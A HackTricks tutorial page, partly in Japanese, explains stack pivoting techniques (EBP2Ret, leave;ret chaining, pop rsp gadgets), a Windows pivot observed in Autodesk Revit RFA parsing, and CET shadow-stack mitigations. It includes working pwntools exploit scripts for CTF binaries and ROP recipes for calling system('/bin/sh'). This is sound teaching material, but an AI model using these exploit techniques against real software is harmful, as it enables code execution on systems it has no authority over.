# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

この手法は、**Base Pointer (EBP/RBP)** を操作する能力を悪用し、frame pointer と **`leave; ret`** 命令シーケンスを慎重に利用することで複数の関数の実行を連鎖させます。

念のため、x86/x86-64上で **`leave`** は次の操作と同等です:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```
And as the saved **EBP/RBP is in the stack** before the saved EIP/RIP, it's possible to control it by controlling the stack.

> Notes
> - On 64-bit, replace EBP→RBP and ESP→RSP. Semantics are the same.
> - Some compilers omit the frame pointer (see “EBP might not be used”). In that case, `leave` might not appear and this technique won’t work.

### EBP2Ret

この手法は、保存された EBP/RBP を変更できるが EIP/RIP を直接変更する手段がない場合に特に有用です。関数のエピローグの振る舞いを利用します。

`fvuln` の実行中に、スタックにあなたの shellcode/ROP チェーンのアドレスが置かれているメモリ領域を指す **偽の EBP** を注入できれば（`pop` を考慮して amd64 では +8 バイト、x86 では +4 バイト）、RIP を間接的に制御できます。関数がリターンするとき、`leave` が RSP を作成した位置に設定し、続く `pop rbp` が RSP を減算して、**結果的に攻撃者がそこに置いたアドレスを指すようになります**。その後 `ret` がそのアドレスを使用します。

Note how you **need to know 2 addresses**: the address where ESP/RSP is going to go, and the value stored at that address that `ret` will consume.

#### Exploit Construction

まず、任意のデータ／アドレスを書き込める**アドレス**を把握する必要があります。RSP はそこを指し、**最初の `ret` を消費します**。

次に、`ret` が実行を移すために使うアドレスを選びます。使用例としては：

- A valid [**ONE_GADGET**](https://github.com/david942j/one_gadget) address.
- The address of **`system()`** followed by the appropriate return and arguments (on x86: `ret` target = `&system`, then 4 junk bytes, then `&"/bin/sh"`).
- The address of a **`jmp esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) followed by inline shellcode.
- A [**ROP**](../rop-return-oriented-programing/index.html) chain staged in writable memory.

Remember that before any of these addresses in the controlled area, there must be **space for the `pop ebp/rbp`** from `leave` (8B on amd64, 4B on x86). You can abuse these bytes to set a **second fake EBP** and keep control after the first call returns.

#### Off-By-One Exploit

保存された EBP/RBP の下位バイトだけを変更できる場合に使われる変種があります。その場合、`ret` でジャンプするアドレスを格納しているメモリ位置は、1バイトの上書きでリダイレクトできるように元の EBP/RBP と最初の 3 バイト／5 バイトを共有している必要があります。通常は低位バイト（オフセット 0x00）を増加させて、近接するページ／アラインされた領域内で可能な限り遠くへジャンプさせます。

また、スタック上に RET sled を配置して実際の ROP チェーンを末尾に置くことで、新しい RSP が sled 内を指し最終的な ROP チェーンが実行される確率を高めるのが一般的です。

### EBP Chaining

スタックの保存された `EBP` スロットに制御されたアドレスを置き、`EIP/RIP` に `leave; ret` gadget を置くことで、`ESP/RSP` を攻撃者制御のアドレスに移動させることが可能です。

こうして `RSP` が制御され、次の命令は `ret` になります。制御されたメモリには次のようなものを置きます：

- `&(next fake EBP)` -> Loaded by `pop ebp/rbp` from `leave`.
- `&system()` -> Called by `ret`.
- `&(leave;ret)` -> After `system` ends, moves RSP to the next fake EBP and continues.
- `&("/bin/sh")` -> Argument for `system`.

この方法で複数の偽 EBP を連鎖させてプログラムのフローを制御できます。

This is like a [ret2lib](../rop-return-oriented-programing/ret2lib/index.html), but more complex and only useful in edge-cases.

Moreover, here you have an [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) that uses this technique with a **stack leak** to call a winning function. This is the final payload from the page:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of another fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
buffer,         # Load leaked address in RBP
LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
> amd64 アラインメントのヒント: System V ABI は呼び出し箇所でスタックを16バイト境界に揃える必要があります。チェーンが `system` のような関数を呼ぶ場合、呼び出し前にアラインメントガジェット（例: `ret`、または `sub rsp, 8 ; ret`）を追加してアラインメントを維持し、`movaps` によるクラッシュを回避してください。

## EBP は使われないことがある

As [**explained in this post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), バイナリがいくつかの最適化でコンパイルされている、または frame-pointer omission が有効な場合、**EBP/RBP は ESP/RSP を制御しません**。したがって、EBP/RBP を制御することで動作するエクスプロイトは失敗します。プロローグ/エピローグがフレームポインタから復元しないためです。

- 最適化されていない / フレームポインタ使用:
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- 最適化済み / frame pointer が省略されている:
```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```
amd64では、`leave ; ret`の代わりに`pop rbp ; ret`をよく見かけますが、フレームポインタが完全に省略されていると、`rbp`ベースのエピローグを介してピボットすることはできません。

## RSPを制御する他の方法

### `pop rsp` gadget

[**In this page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) この手法を使った例が載っています。そのチャレンジでは特定の2つの引数で関数を呼び出す必要があり、**`pop rsp` gadget**が存在し、stackからの**leak**がありました:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg <reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

ここで ret2esp テクニックを確認してください:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

### pivot gadgets を素早く見つける

お好みの gadget finder を使って、classic な pivot primitives を検索してください:

- `leave ; ret` が関数やライブラリにあるもの
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret`（または x86 では `add esp, <imm> ; ret`）

例:
```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```
### Classic pivot staging pattern

多くのCTFやexploitsで使われる堅牢なpivot戦略：

1) 小さな初期オーバーフローを使って `read`/`recv` を大きな書き込み可能領域（例: `.bss`, heap, またはマップされたRWメモリ）へ呼び出し、そこで完全なROPチェーンを配置する。  
2) RSPをその領域に移動させるため、pivot gadget（`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`）にリターンする。  
3) 続いてステージされたチェーンを実行する（例: leak libc, `mprotect` を呼び出し、次に `read` で shellcode を読み込み、それにジャンプする）。

### Windows: Destructor-loop weird-machine pivots (Revit RFA case study)

Client-side パーサは、攻撃者が制御するオブジェクトフィールドから導出された関数ポインタを間接的に呼び出す destructor loop を実装していることがある。各イテレーションが正確に1回の間接呼び出し（“one-gadget” machine）を提供するなら、これを信頼できるstack pivotおよびROPエントリに変換できる。

Observed in Autodesk Revit RFA deserialization (CVE-2025-5037):

- 型 `AString` の細工されたオブジェクトは、オフセット0に attacker bytes へのポインタを配置する。  
- The destructor loop は実質的にオブジェクトごとに1つの gadget を実行する：
```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```
Two practical pivots:

- Windows 10 (32-bit heap addrs): misaligned “monster gadget” that contains `8B E0` → `mov esp, eax`, eventually `ret`, to pivot from the call primitive to a heap-based ROP chain.
- Windows 11 (full 64-bit addrs): use two objects to drive a constrained weird-machine pivot:
- Gadget 1: `push rax ; pop rbp ; ret` (move original rax into rbp)
- Gadget 2: `leave ; ... ; ret` (becomes `mov rsp, rbp ; pop rbp ; ret`), pivoting into the first object’s buffer, where a conventional ROP chain follows.

Tips for Windows x64 after the pivot:

- Respect the 0x20-byte shadow space and maintain 16-byte alignment before `call` sites. It’s often convenient to place literals above the return address and use a gadget like `lea rcx, [rsp+0x20] ; call rax` followed by `pop rax ; ret` to pass stack addresses without corrupting control flow.
- Non-ASLR helper modules (if present) provide stable gadget pools and imports such as `LoadLibraryW`/`GetProcAddress` to dynamically resolve targets like `ucrtbase!system`.
- Creating missing gadgets via a writable thunk: if a promising sequence ends in a `call` through a writable function pointer (e.g., DLL import thunk or function pointer in .data), overwrite that pointer with a benign single-step like `pop rax ; ret`. The sequence then behaves like it ended with `ret` (e.g., `mov rdx, rsi ; mov rcx, rdi ; ret`), which is invaluable to load Windows x64 arg registers without clobbering others.

For full chain construction and gadget examples, see the reference below.

## Modern mitigations that break stack pivoting (CET/Shadow Stack)

Modern x86 CPUs and OSes increasingly deploy **CET Shadow Stack (SHSTK)**. With SHSTK enabled, `ret` compares the return address on the normal stack with a hardware-protected shadow stack; any mismatch raises a Control-Protection fault and kills the process. Therefore, techniques like EBP2Ret/leave;ret-based pivots will crash as soon as the first `ret` is executed from a pivoted stack.

- For background and deeper details see:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Quick checks on Linux:
```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```
- ラボ/CTF向けメモ:
- 一部のモダンなディストリは、ハードウェアと glibc のサポートがある場合に CET 対応バイナリ向けに SHSTK を有効にします。VM での制御されたテストでは、カーネルブートパラメータ `nousershstk` でシステム全体を無効化したり、起動時の glibc tunables を介して選択的に有効化したりできます（参照）。本番ターゲットで緩和策を無効化しないでください。
- JOP/COOP や SROP ベースの手法は一部のターゲットでまだ有効な場合がありますが、SHSTK は特に `ret` ベースのピボットを無効にします。

- Windows note: Windows 10+ は user-mode を提供し、Windows 11 は shadow stacks に基づくカーネルモードの “Hardware-enforced Stack Protection” を追加します。CET-compatible processes は `ret` によるスタックピボット/ROP を防ぎます; 開発者は CETCOMPAT や関連ポリシーでオプトインします（参照）。

## ARM64

In ARM64, the **prologue and epilogues** of the functions **don't store and retrieve the SP register** in the stack. Moreover, the **`RET`** instruction doesn't return to the address pointed by SP, but **to the address inside `x30`**.

Therefore, by default, just abusing the epilogue you **won't be able to control the SP register** by overwriting some data inside the stack. And even if you manage to control the SP you would still need a way to **control the `x30`** register.

- prologue

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```

- epilogue

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> ARM64でstack pivotingに類することを行うには、まず**`SP` を制御できる**（あるレジスタの値が `SP` に渡されることで、あるいは何らかの理由で `SP` がスタック上のアドレスを取っておりオーバーフローがあるため）必要があり、その後**エピローグを悪用して**制御された `SP` から **`x30`** レジスタをロードし、**`RET`** でそこに戻ることが必要です。

Also in the following page you can see the equivalent of **Ret2esp in ARM64**:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## 参考資料

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64 bit、off-by-one の悪用で、ret sled から始まる rop チェーン
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64 bit、relro、canary、nx、pie が無効。プログラムはスタックまたは pie の leak と qword の WWW を与えます。まずスタックの leak を取得し、WWW を使って戻って pie の leak を得ます。次に WWW を利用して `.fini_array` エントリを悪用し `__libc_csu_fini` を呼ぶことで永続的なループを作ります（[詳細はこちら](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)）。この「永続的な」書き込みを悪用して .bss に ROP チェーンを書き込み、RBP を使ってピボットして呼び出します。
- Linux kernel documentation: Control-flow Enforcement Technology (CET) Shadow Stack — SHSTK、`nousershstk`、`/proc/$PID/status` フラグ、および `arch_prctl` による有効化の詳細。 https://www.kernel.org/doc/html/next/x86/shstk.html
- Microsoft Learn: Kernel Mode Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection
- [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)

{{#include ../../banners/hacktricks-training.md}}
